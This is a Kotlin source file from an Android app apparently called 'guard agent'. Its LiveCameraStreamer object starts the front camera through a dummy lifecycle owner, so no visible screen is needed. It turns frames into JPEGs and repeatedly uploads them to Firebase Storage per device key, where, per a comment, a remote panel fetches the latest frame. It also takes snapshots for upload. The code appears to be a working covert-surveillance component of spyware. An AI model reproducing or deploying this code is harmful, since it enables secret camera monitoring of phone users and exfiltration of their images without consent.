package com.guard.agent.helpers.media

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.graphics.Rect
import android.graphics.YuvImage
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.core.ImageProxy
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import com.guard.agent.core.Constants
import com.guard.agent.utils.Logger
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

object LiveCameraStreamer {

    private const val TAG = "LiveCameraStreamer"
    private const val UPLOAD_INTERVAL_MS = 1500L  // 1.5 sec

    private var cameraProvider: ProcessCameraProvider? = null
    private var imageCapture: ImageCapture? = null
    private var imageAnalysis: ImageAnalysis? = null
    private var lifecycleOwner: DummyLifecycleOwner? = null

    private val isRunning = AtomicBoolean(false)
    private val executor = Executors.newSingleThreadExecutor()
    private var lastUploadTime = 0L
    private var latestBitmap: Bitmap? = null

    /**
     * Live camera stream start karo.
     * @param fps Frames per second (1-3 recommended)
     */
    fun start(ctx: Context, deviceKey: String, fps: Int = 1) {
        if (isRunning.get()) {
            Logger.w(TAG, "Already running")
            return
        }
        isRunning.set(true)

        try {
            val future = ProcessCameraProvider.getInstance(ctx)
            future.addListener({
                try {
                    val provider = future.get()
                    cameraProvider = provider

                    val owner = DummyLifecycleOwner()
                    owner.start()
                    lifecycleOwner = owner

                    val selector = CameraSelector.DEFAULT_FRONT_CAMERA

                    // ImageAnalysis for continuous stream
                    val analysis = ImageAnalysis.Builder()
                        .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                        .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_YUV_420_888)
                        .build()

                    analysis.setAnalyzer(executor) { imageProxy ->
                        processFrame(imageProxy, ctx, deviceKey, fps)
                    }
                    imageAnalysis = analysis

                    // ImageCapture for high quality snapshots
                    val capture = ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                        .build()
                    imageCapture = capture

                    provider.unbindAll()
                    provider.bindToLifecycle(owner, selector, analysis, capture)

                    Logger.d(TAG, "Camera stream started (fps=$fps)")
                } catch (e: Exception) {
                    Logger.e(TAG, "start failed", e)
                    isRunning.set(false)
                }
            }, ContextCompat.getMainExecutor(ctx))
        } catch (e: Exception) {
            Logger.e(TAG, "start outer failed", e)
            isRunning.set(false)
        }
    }

    /**
     * Frame process karo — analysis se bitmap banao, upload karo.
     */
    private fun processFrame(
        imageProxy: ImageProxy,
        ctx: Context,
        deviceKey: String,
        fps: Int
    ) {
        try {
            val now = System.currentTimeMillis()
            val interval = if (fps > 0) 1000L / fps else UPLOAD_INTERVAL_MS
            if (now - lastUploadTime < interval) {
                imageProxy.close()
                return
            }
            lastUploadTime = now

            val bitmap = imageProxyToBitmap(imageProxy)
            imageProxy.close()

            if (bitmap == null) return

            // Scale down (bandwidth bachane ke liye)
            val scaled = scaleBitmap(bitmap, 640)

            // Local server ke liye update
            StreamServer.updateFrame(scaled)

            // Firebase upload
            uploadFrame(ctx, deviceKey, scaled)
        } catch (e: Exception) {
            Logger.e(TAG, "processFrame failed", e)
            try { imageProxy.close() } catch (_: Exception) {}
        }
    }

    /**
     * ImageProxy (YUV) ko Bitmap mein convert karo.
     */
    private fun imageProxyToBitmap(imageProxy: ImageProxy): Bitmap? {
        return try {
            val yBuffer = imageProxy.planes[0].buffer
            val uBuffer = imageProxy.planes[1].buffer
            val vBuffer = imageProxy.planes[2].buffer

            val ySize = yBuffer.remaining()
            val uSize = uBuffer.remaining()
            val vSize = vBuffer.remaining()

            val nv21 = ByteArray(ySize + uSize + vSize)
            yBuffer.get(nv21, 0, ySize)
            vBuffer.get(nv21, ySize, vSize)
            uBuffer.get(nv21, ySize + vSize, uSize)

            val yuvImage = YuvImage(
                nv21,
                ImageFormat.NV21,
                imageProxy.width,
                imageProxy.height,
                null
            )

            val out = ByteArrayOutputStream()
            yuvImage.compressToJpeg(Rect(0, 0, imageProxy.width, imageProxy.height), 60, out)
            val bytes = out.toByteArray()
            BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
        } catch (e: Exception) {
            Logger.e(TAG, "imageProxyToBitmap failed", e)
            null
        }
    }

    /**
     * Bitmap ko scale karo (max width).
     */
    private fun scaleBitmap(bitmap: Bitmap, maxWidth: Int): Bitmap {
        return try {
            if (bitmap.width <= maxWidth) return bitmap
            val ratio = maxWidth.toFloat() / bitmap.width
            val newH = (bitmap.height * ratio).toInt()
            Bitmap.createScaledBitmap(bitmap, maxWidth, newH, true)
        } catch (_: Exception) {
            bitmap
        }
    }

    /**
     * Frame ko Firebase Storage pe upload karo (live/frame.jpg).
     * Har baar same file overwrite hoti hai — panel latest frame fetch karta hai.
     */
    private fun uploadFrame(ctx: Context, deviceKey: String, bitmap: Bitmap) {
        try {
            val bos = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, bos)
            val bytes = bos.toByteArray()

            val ref = FirebaseStorage.getInstance().reference
                .child("live/$deviceKey/frame.jpg")

            ref.putBytes(bytes)
                .addOnSuccessListener {
                    // Latest frame ka timestamp update karo
                    FirebaseDatabase.getInstance()
                        .getReference(Constants.PATH_DEVICES)
                        .child(deviceKey).child("liveFrame")
                        .setValue(
                            mapOf(
                                "time" to System.currentTimeMillis(),
                                "size" to bytes.size
                            )
                        )
                }
                .addOnFailureListener { e ->
                    Logger.e(TAG, "Frame upload failed", e)
                }
        } catch (e: Exception) {
            Logger.e(TAG, "uploadFrame failed", e)
        }
    }

    /**
     * High quality photo capture (stream ke saath).
     */
    @SuppressLint("MissingPermission")
    fun captureHighQuality(ctx: Context, deviceKey: String) {
        val capture = imageCapture ?: return
        try {
            val file = File(ctx.cacheDir, "live_snap_${System.currentTimeMillis()}.jpg")
            val opts = ImageCapture.OutputFileOptions.Builder(file).build()

            capture.takePicture(opts, executor,
                object : ImageCapture.OnImageSavedCallback {
                    override fun onImageSaved(out: ImageCapture.OutputFileResults) {
                        CameraHelper.upload(ctx, deviceKey, file, Constants.SUB_PHOTOS)
                    }

                    override fun onError(e: ImageCaptureException) {
                        Logger.e(TAG, "HQ capture error", e)
                        file.delete()
                    }
                })
        } catch (e: Exception) {
            Logger.e(TAG, "captureHighQuality failed", e)
        }
    }

    /**
     * Stream band karo.
     */
    fun stop() {
        if (!isRunning.get()) return
        isRunning.set(false)

        try {
            imageAnalysis?.clearAnalyzer()
            imageAnalysis = null
            imageCapture = null
            cameraProvider?.unbindAll()
            cameraProvider = null
            lifecycleOwner?.stop()
            lifecycleOwner = null
            latestBitmap = null
            Logger.d(TAG, "Camera stream stopped")
        } catch (e: Exception) {
            Logger.e(TAG, "stop failed", e)
        }
    }

    fun isRunning(): Boolean = isRunning.get()

    /**
     * Dummy LifecycleOwner — CameraX ko chahiye.
     */
    private class DummyLifecycleOwner : LifecycleOwner {
        private val registry = LifecycleRegistry(this)
        override val lifecycle: Lifecycle get() = registry

        fun start() {
            registry.currentState = Lifecycle.State.RESUMED
        }

        fun stop() {
            registry.currentState = Lifecycle.State.DESTROYED
        }
    }
}
